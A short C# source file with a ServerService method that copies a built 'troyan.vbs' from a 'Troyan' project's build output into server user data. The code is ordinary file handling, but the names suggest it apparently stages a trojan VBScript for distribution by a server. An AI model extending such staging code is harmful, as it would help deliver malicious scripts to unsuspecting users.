namespace Commons;

public partial class ServerService
{
    /// <summary>Copies the built <c>troyan.vbs</c> from Troyan <c>_output</c> into server user data (<see cref="ServerLayoutPaths.UserTroyanVbs"/>), replacing any existing file. Creates the user data directory if it does not exist.</summary>
    public void PublishTroyanVbsFromBuildOutput(ServerLayoutPaths layout)
    {
        ArgumentNullException.ThrowIfNull(layout);

        var src = layout.TroyanOutputVbs;
        var dest = layout.UserTroyanVbs;
        if (!File.Exists(src))
            throw new FileNotFoundException("Built troyan.vbs not found in Troyan _output.", src);

        var destDir = Path.GetDirectoryName(dest);
        if (!string.IsNullOrEmpty(destDir))
            Directory.CreateDirectory(destDir);

        File.Copy(src, dest, overwrite: true);
    }

    /// <inheritdoc cref="PublishTroyanVbsFromBuildOutput(ServerLayoutPaths)"/>
    public void PublishTroyanVbsFromBuildOutput() => PublishTroyanVbsFromBuildOutput(Layout());
}
